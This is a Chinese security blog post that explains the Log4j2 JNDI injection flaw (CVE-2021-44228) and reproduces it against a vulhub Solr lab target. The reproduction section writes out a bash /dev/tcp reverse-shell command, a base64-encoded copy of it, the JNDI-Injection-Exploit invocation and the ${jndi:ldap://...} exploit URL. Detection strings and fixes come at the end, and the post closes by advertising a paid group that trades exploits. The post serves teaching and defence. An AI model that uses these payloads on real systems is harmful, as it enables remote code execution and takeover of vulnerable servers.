#  Java反序列化漏洞 | log4j2远程代码执行漏洞原理+漏洞复现   
原创 神农Sec  神农Sec   2024-12-24 01:01  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 前言**  
  
  
在看我写的log4j2远程代码执行漏洞之前，师傅们可以看看我前面写的《JNDI注入原理及利用IDEA漏洞复现》这篇文章，因为log4j2远程代码执行漏洞里面有讲JNDI注入，这样可以对师傅的理解更加深刻也更加容易理解！同时分享下哔哩哔哩UP主讲的JNDI注入，零基础教学：  
  
【红队攻击手特训营-JNDI注入漏洞挖掘】   
https://www.bilibili.com/video/BV1Ne4y1o7ch/?share_source=copy_web&vd_source=268f8d699ac32cf11e9bdc248399c5bd  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 漏洞原理及简介**  
  
### 一、log4j2简介  
  
log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。  
  
### 二、JNDI简介  
  
JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。  
  
  
上面较官方说法，通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的 命令服务  
和目录服务  
,如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaT2119b6HrqmFSkr44FmnXhocaWpMMo9FuGsEmuNGp2HiaKJEgWUhp0w/640?wx_fmt=png&from=appmsg "")  
<table><thead><tr><th valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">协议</span></span></section></th><th valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">作用</span></span></section></th></tr></thead><tbody><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">LDAP</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</span></span></section></td></tr><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">RMI</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</span></span></section></td></tr><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">DNS</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">域名服务</span></span></section></td></tr><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">CORBA</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;font-weight: normal;">公共对象请求代理体系结构</span></span></section></td></tr></tbody></table>  
### 三、log4j2远程代码执行漏洞原理  
- CVE漏洞编号：CVE-2021-44228  
  
- 受影响版本：Apache Log4j 2.x <= 2.14.1  
  
<table><thead><tr><th valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">漏洞名称</span></span></section></th><th valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">漏洞名称 Apache Log4j 代码问题漏洞</span></span></section></th></tr></thead><tbody><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">漏洞编号</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">CVE-2021-44228</span></span></section></td></tr><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">危害等级</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">严重</span></span></section></td></tr><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">CVSS评分</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">10</span></span></section></td></tr><tr><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">漏洞类型</span></span></section></td><td valign="top"><section><span leaf=""><span textstyle="" style="font-size: 16px;">代码问题</span></span></section></td></tr></tbody></table>  
****  
**原理：**  
  
**log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。**  
  
攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）。  
  
  
图解如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaUI3NibbtHncT7xicUYacMIN3poAx4VAYg2x6GJM1gdh4vlNKGAqibCic1w/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 漏洞复现**  
##   
### 一、环境搭建  
  
靶机：Ubantu IP 192.168.103.161 （先要安装docker，然后下载vulhub） 启动vulhub里面的log4j环境  
  
攻击机：kali IP 192.168.103.129  
  
我们先进入/vulhub/log4j/CVE-2021-44228目录下，然后利用docker启动靶机环境  
```
docker-compose up -d
```  
```


```  
  
查看靶机的端口情况，发现靶机的端口为8983  
```
docker ps
```  
```


```  
  
  
访问我们的ubantu靶机的vulhub地址：192.168.103.162:8983/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaamWib9icGZxuI9IicqIvEWwxDBYZlY1heohFLILXkM6AXgj2mb2RB1Ghg/640?wx_fmt=png&from=appmsg "")  
  
  
### 二、利用DNS漏洞检测  
  
用dnslog平台检测dns回显，看看有没有漏洞存在，网址为：  
DNSLog Platform  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaZ5CmYhW2cHB6YV2JaicOyJXckTJ8PxHs79WpcCic78050LKcjvDNsBaQ/640?wx_fmt=png&from=appmsg "")  
  
  
点击Get SubDomin获取一个子域名，我这里是ozuyfo.dnslog.cn  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOa1jN9aiafXKQIqJnLe7yP5EDD9qy6EhGTEpTibrlLaYLPY12AP8QQ1MJQ/640?wx_fmt=png&from=appmsg "")  
  
```
找到JNDI的注入点在/solr/admin/cores?action=${jndi:ldap://ozuyfo.dnslog.cn}
其中ozuyfo.dnslog.cn是DNSlog的地址，用来检测是否有log4j漏洞的。
```  
  
点击Refresh Record刷新平台，然后就会看到下面的回显，说明存在log4j漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaJhmXU4oH2S3ibALZa89iaqcFNROS8efgfgic70S7GC29bRibdIKdlN2GcA/640?wx_fmt=png&from=appmsg "")  
  
### 三、利用JNDI工具反弹shell  
  
我们直接利用JNDI注入工具进行反弹shell的复现操作  
  
JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar工具下载地址：  
https://github.com/bkfish/Apache-Log4j-Learning/tree/main  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaTqicmXxjqSdrAiaUZ7FB3Hkdh2J5MnLquXicYH2QIgBLtnZAjhRRD3rPA/640?wx_fmt=png&from=appmsg "")  
  
  
反弹shell的命令：  
```
bash -i >& /dev/tcp/192.168.103.129/1234 0>&1
```  
```


```  
  
这个反弹shell的命令在执行之前必须要base64编码一下，  
  
Runtime.exec Payload Generater | AresX's Blog (ares-x.com)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOabd4a89s2k2vopz6FBBdLRJI7KnGokjebs1yOdYHIh94ECmqiaZ60hMQ/640?wx_fmt=png&from=appmsg "")  
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMy4xMjkvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
```  
```


```  
  
应用工具JNDI-Injection-Exploit搭建服务：格式：  
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "命令" -A "kali IP地址"
```  
```


```  
#### 步骤如下  
  
1、我们先在kali进行监听1234端口  
```
┌──(root💀kali)-[~]
└─# nc -lvnp 1234
```  
  
2、**执行EXP，生成可用的payload**  
（这里建议在kali里面执行这个命令，因为我开始用windows本地没有反弹shell成功） 编码后的命令通过-C参数输入JNDI工具，通过通过-A参数指定kali的ip地址：  
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMy4xMjkvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}" -A "192.168.103.129"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaYwzJlPU0uB23paph9tGoVKGFO6icFHd977dgFHENBn3GFBphcJuFMlg/640?wx_fmt=png&from=appmsg "")  
  
可以看到，这里已经一键部署好了RMI和LDAP服务的站点，并给出了路径，其中JDK1.7和JDK1.8的都可以，并且rmi和ldap两个协议都可以进行JNDI注入测试，但是如果你了解了这个漏洞修复的时间以及版本，就会知道ldap的版本使用范围更具广，这就是为什么大多数人会用ldap测试的原因。  
  
  
3、 最后一步就是构造payload了，由于是GET方式，浏览器访问以下任意一个url即可：  
  
我这里就使用ldap协议进行演示反弹shell了，payload如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOaYF6PFtPe8z7NQRVSXDzxszs0ib3BMW4Df6k6dHNYLvQGewUkBL8vm4w/640?wx_fmt=png&from=appmsg "")  
```
http://192.168.103.161:8983/solr/admin/cores?action=${jndi:ldap://192.168.103.129:1389/a1syrh}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOa9P0EWITtGG17xibjS4Z9UhVcdPibGOoSDVhLibib21WW4GBUpkXBOqo6ibA/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到我们的反弹shell执行成功了，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOawMicLiaJHtrF5zPwMXaYLKYsfFRichlAk6eRGuv2pEmNREMBoKHJeBsbg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOajcDRcmiasFjdSKBH0PiaBdsz4KAuDPJA2vUdauY3tBk5oONnqEsMrk8A/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 总结**  
##   
### 如何排查log4j2漏洞？  
  
检查日志中是否存在"jndi:ldap://"、"jndi:rmi//"等字符来发现可能的攻击行为，前面复现的过程在payload的构造中都出现了这样的字符串，这是攻击的典型标志。  
  
其中像现在的话很多人不会直接利用rmi和ldap服务去检测攻击你的服务器，而是直接调用外面开始利用DNSlog检测，因为利用rmi和ldap会直接暴露自己的服务器的IP地址，所以对于"dns://"也要进行检测判断是否是攻击行为  
  
### 如何对log4j2的攻击进行防御？  
  
1.设置log4j2.formatMsgNoLookups=True。相当于直接禁止lookup查询出栈，也就不可能请求到访问到远程的恶意站点。  
  
2.对包含有"jndi:ldap://"、"jndi:rmi//"、"dns://"这样字符串的请求进行拦截，即拦截JNDI语句来防止JNDI注入。  
  
3.对系统进行合理配置，禁止不必要的业务访问外网，配置网络防火墙,禁止系统主动外连网络等等。  
  
4.升级log4j2组件到新的安全的版本。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUYPCRP3m40cWfqPjuvYeOavbCItTBHFUgothJSribpUyNvZTdXU1d7wmmibmO9iaNXZGX3Id7Rl3IVg/640?wx_fmt=png&from=appmsg "")  
  
  
  
我们是神农安全，  
**点赞 + 在看**  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、微信小群一起挖洞
5、不定期有众测、渗透测试项目
```  
  
  
  
  
  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWBeNFS2WNPd2FJ1SmqGkcf3s0DkMZicbriaUEuXagWt2eqxBWkUXRyQabIczmNAT5nTxc9tvaBzlww/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满200人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
    
  
  
